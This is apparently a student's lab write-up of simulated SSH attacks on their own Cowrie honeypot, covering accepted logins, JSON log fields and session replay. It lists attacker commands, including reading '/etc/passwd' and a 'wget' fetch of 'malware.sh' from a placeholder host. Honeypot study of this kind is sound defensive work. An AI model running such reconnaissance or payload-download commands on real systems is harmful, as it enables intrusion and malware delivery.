Findings Summary

I ran 3 separate simulated SSH attack sessions against my Cowrie honeypot from my host machine, targeting 192.168.111.129 on port 22 (redirected to Cowrie's listener on 2222).



Login attempts:

root / akash → logged by Cowrie as "login attempt \[root/akash] succeeded"

admin / akash → logged as "login attempt \[admin/akash] succeeded"

test / (password) → also accepted

Even though none of these are real credentials, Cowrie accepted all of them and logged each attempt with the exact username, password, source IP, source port, and timestamp — showing how the honeypot lures in and records credential-guessing behavior.



Commands executed inside the fake sessions:

whoami and uname -a — basic system fingerprinting, the same first move real attackers make to identify what they've broken into

ls -la and cat /etc/passwd — reconnaissance, checking the filesystem and looking for other user accounts

wget http://example.com/malware.sh — simulating a payload download; Cowrie faked a full HTTP response and logged a SHA-256 hash of the "downloaded" file, exactly as a real download would be recorded



What the JSON log captured beyond the plain text log:

The structured cowrie.json log recorded every event as a separate machine-readable entry — including session ID, src\_ip, src\_port, dst\_port, eventid (e.g. cowrie.login.success, cowrie.command.input, cowrie.session.closed), exact timestamp, session duration\_ms, and the SHA-256 shasum of the downloaded file. This structured format is exactly what a SIEM tool like Splunk ingests for correlation and alerting — the plain .log file is just human-readable text, but the JSON version is what a real SOC pipeline would consume.



Session replay:

Using Cowrie's playlog tool, I replayed one full session keystroke-by-keystroke, reproducing the entire fake login and command sequence exactly as it happened in real time.

